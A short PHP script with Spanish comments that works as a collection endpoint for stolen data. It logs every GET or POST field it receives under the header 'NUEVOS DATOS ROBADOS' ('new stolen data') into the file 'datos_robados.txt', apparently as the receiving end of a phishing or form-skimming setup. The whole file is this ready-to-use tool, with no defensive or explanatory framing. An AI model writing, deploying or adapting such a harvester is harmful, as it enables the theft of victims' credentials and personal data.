<?php
// recibe_datos.php

// Si vienen datos por GET o POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' || !empty($_GET)) {
    
    // Recopilar todos los datos
    $data = $_POST;
    if (empty($data)) {
        $data = $_GET;
    }

    if (!empty($data)) {
        // Formatear los datos para guardarlos
        $output = "=== NUEVOS DATOS ROBADOS ===\n";
        foreach ($data as $key => $value) {
            $output .= "$key: $value\n";
        }
        $output .= "===========================\n";
        $output .= "Fecha: " . date('Y-m-d H:i:s') . "\n\n";

        // Guardar en un archivo de texto (datos_robados.txt)
        // Asegúrate de que el hosting tenga permisos de escritura
        file_put_contents('datos_robados.txt', $output, FILE_APPEND | LOCK_EX);
    }
}
?>